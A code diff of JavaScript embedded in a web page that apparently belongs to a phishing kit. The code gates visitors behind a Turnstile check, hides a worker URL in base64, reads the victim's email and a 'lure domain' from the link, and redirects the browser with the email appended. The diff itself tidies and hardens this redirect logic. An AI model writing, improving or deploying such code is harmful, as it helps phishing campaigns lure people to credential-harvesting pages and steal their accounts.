@@ -268,63 +268,61 @@ async function getRedirectUrlWithEmail(base64Url, email) {
         return null;
     }
 }
-        
-// Start Turnstile verification
+        // Start Turnstile verification
 function startTurnstileVerification() {
     const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
     if (USE_TURNSTILE) {
-        console.log('Starting Turnstile verification...');
-        turnstile.render('#cf-turnstile', {
-            sitekey: '0x4AAAAAAAymSY_rn4CFRQRl',
-            type: 'spinner',
+        console.log("Starting Turnstile verification...");
+        turnstile.render("#cf-turnstile", {
+            sitekey: "0x4AAAAAAAymSY_rn4CFRQRl",
+            type: "spinner",
             callback: async function (token) {
                 if (!token) {
-                    console.error('Turnstile verification failed');
+                    console.error("Turnstile verification failed");
                     return;
                 }
 
                 // Show loading animation again
-                loadingDiv.style.display = 'flex';
+                loadingDiv.style.display = "flex";
 
                 // Extract and decode email from URL
-                var email = extractAndDecodeEmail();
-                var domain = extractLureDomain();
+                const email = extractAndDecodeEmail();
+                const domain = extractLureDomain();
+
+                // Validate domain and email
+                if (!email || !domain) {
+                    console.error("Missing email or domain. Cannot redirect.");
+                    loadingDiv.style.display = "none"; // Hide loading animation
+                    return;
+                }
+
                 // Set a cookie for verification (optional)
-                document.cookie = 'verified=true; Path=/; SameSite=None; Secure=true';
+                document.cookie = "verified=true; Path=/; SameSite=None; Secure=true";
+
+                // Construct the redirect URL
+                const redirectUrl = `${domain}#POP=${email}?redirected=done`;
 
                 // Wait for 3 seconds, then redirect
-                setTimeout(async function() {
-                    loadingDiv.style.display = 'none';
+                setTimeout(function () {
+                    loadingDiv.style.display = "none";
 
-                    if (email) {
-                        // Get the final redirect URL
-                        const redirectUrl = `${domain}POP=${email}`;
-                        if (redirectUrl) {
-                            console.log('Redirecting with email:', email); // Debug log to check the email
-                            window.location.href = redirectUrl;
-                        } else {
-                            console.log('Failed to retrieve redirect URL.');
-                        }
-                    } else {
-                        console.log('No email found to append to URL.');
-                    }
+                    console.log("Redirecting to:", redirectUrl); // Debug log to verify URL
+                    window.location.href = redirectUrl; // Perform the redirection
                 }, 2000);
             },
-            'error-callback': function () {
-                console.error('Turnstile encountered an error');
-            }
+            "error-callback": function () {
+                console.error("Turnstile encountered an error");
+            },
         });
     } else {
-        console.log('Turnstile is not enabled.');
+        console.log("Turnstile is not enabled.");
     }
 }
 
 // Run Turnstile verification
 startTurnstileVerification();
 
-        // Example usage of email extraction (optional)
-        var email = extractAndDecodeEmail();
-        console.log('Extracted and Decoded Email:', email);
+
     };
 </script>
 
